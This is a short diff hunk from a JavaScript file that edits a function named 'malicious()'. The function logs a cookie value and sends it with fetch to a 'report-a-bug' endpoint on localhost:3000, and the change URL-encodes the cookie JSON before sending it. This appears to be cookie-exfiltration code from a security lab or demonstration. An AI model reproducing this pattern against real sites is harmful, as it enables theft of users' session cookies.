@@ -89,7 +89,9 @@ function malicious() {
 
                   console.log(cookie)
 
-                  fetch('http://localhost:3000/report-a-bug?bug=' + JSON.stringify(cookie), {mode:'cors'})
+                  console.log('http://localhost:3000/report-a-bug?bug=' + encodeURIComponent(JSON.stringify(cookie)))
+
+                  fetch('http://localhost:3000/report-a-bug?bug=' + encodeURIComponent(JSON.stringify(cookie)), {mode:'cors'})
                     .then(response => console.log(response.json()))
 
                 }
